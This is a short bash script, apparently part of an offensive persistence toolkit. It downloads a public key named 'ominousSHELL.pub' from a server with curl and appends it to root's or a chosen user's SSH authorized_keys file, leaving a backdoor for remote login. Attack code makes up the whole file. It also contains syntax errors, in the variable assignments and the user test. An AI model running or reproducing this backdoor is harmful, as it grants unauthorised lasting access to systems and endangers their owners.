#!/bin/bash

#COLORS
path="/root/.ssh/"
file_path="/root/.ssh/authorized_keys"
blue="\033[01;34m"
green="\033[01;32m"
red="\033[01;31m"
reset="\033[0m"

public_key_authentication(){
	read -p "Enter name of current user (root): " user

	if [[ $user != ' ']];then
		file_path = "/home/$user/.ssh/authorized_keys"
		path = "/home/$user/.ssh/"
	fi

	if [[ -w "$path" ]];then
		if [[ -w "$file_path" ]];then
			curl -sS http://127.0.0.1/persistence/ssh/ominousSHELL.pub >> $file_path
			if [[ $? == 0 ]];then
					printf "$green[+] Done\n"
					printf "$green[+] File: $file_path\n"
			else
					printf "$red[-] Error occured.\n" 
			fi
		else
			printf "$red[-] Error: File \"$file_path\" doesn't exist or is not writable.\n"
		fi
	else
		printf "$red[-] Error: Directory \"$path\" doesn't exists or is not writable.\n"

	fi
}

echo "[1/1] Attempting to store public key..."
public_key_authentication
